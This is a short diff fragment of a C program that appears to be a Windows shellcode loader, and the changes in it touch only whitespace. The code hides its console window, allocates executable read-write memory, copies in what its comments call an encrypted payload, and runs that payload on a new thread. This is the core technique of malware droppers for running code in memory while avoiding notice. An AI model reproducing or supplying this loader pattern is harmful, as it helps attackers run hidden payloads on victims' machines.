@@ -11,15 +11,15 @@ int main(int argc, char * argv[])
 	char lpFileName[200];
 	LPSTR out = NULL;
 	HANDLE th = NULL;
-	
+
 	FreeConsole();
-	
+
 	//allocate executable payload in memory
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
+
 	//copy our encrypted payload into that memory
 	RtlMoveMemory(exec_mem, payload, payload_len);
-	
+
 	//create thread with our payload running
 	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 	if(th != NULL){
